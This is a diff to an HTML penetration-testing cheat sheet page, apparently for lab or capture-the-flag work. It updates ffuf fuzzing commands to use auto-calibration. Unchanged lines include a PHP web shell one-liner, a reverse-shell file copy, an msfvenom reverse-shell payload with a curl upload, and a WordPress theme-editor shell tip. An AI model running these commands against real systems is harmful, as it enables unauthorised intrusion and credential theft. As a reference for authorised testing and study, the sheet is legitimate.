@@ -121,7 +121,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.12.0</span>
+  <span class="ver">v1.12.1</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -211,10 +211,10 @@ curl -sSik http://$IP/robots.txt
 nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP</code></pre></div>
 <p><strong>Directory brute</strong> (pick one; <code>-d 2</code> stops ferox recursing into a phone book)</p>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
-ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac -c
 gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</code></pre></div>
 <p><strong>Vhost / subdomain fuzz</strong> (add <code>&lt;host&gt;</code> to /etc/hosts first)</p>
-<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>ffuf -u http://$IP -H &quot;Host: FUZZ.&lt;host&gt;&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs &lt;baseline-size&gt;</code></pre></div>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>ffuf -u http://$IP -H &quot;Host: FUZZ.&lt;host&gt;&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac   # -ach = per host</code></pre></div>
 <p><strong>WordPress</strong> — admin panel &amp;rarr; Appearance &amp;rarr; Theme Editor &amp;rarr; 404.php = PHP shell; <code>wp-config.php</code> holds the DB creds.</p>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>curl -s http://$IP/readme.html | grep -i version
 wpscan --url http://$IP --enumerate ap,at,u,cb,dbe --plugins-detection aggressive --api-token &lt;token&gt;
@@ -271,8 +271,10 @@ curl -T shell.php http://$IP/</code></pre></div>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; cmd.php
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx</code></pre></div>
-<p><strong>Fuzz the parameter, not just the path</strong> — a page that ignores you may just want a different name. Filter on a baseline or every wordlist entry looks like a hit.</p>
-<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>ffuf -u &#x27;http://$IP/index.php?FUZZ=test&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs &lt;size&gt;
+<p><strong>Fuzz the parameter, not just the path</strong> — a page that ignores you may just want a different name. Let <code>-ac</code> work out the baseline for you.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>ffuf -u &#x27;http://$IP/index.php?FUZZ=test&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c
+# -ac fires junk values first and filters whatever &#x27;nothing happened&#x27; looks like; if a real hit
+# matches the baseline it gets filtered too, so then measure it: -fs size | -fw words | -fc code | -fr regex
 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw &lt;words&gt; &#x27;http://$IP/index.php?FUZZ=test&#x27;</code></pre></div>
 <p><strong>The certificate is free intelligence</strong> — SANs are vhosts you have not found yet, and the Subject holds internal hostnames and usernames.</p>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>openssl s_client -connect $IP:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E &#x27;Subject:|DNS:&#x27;
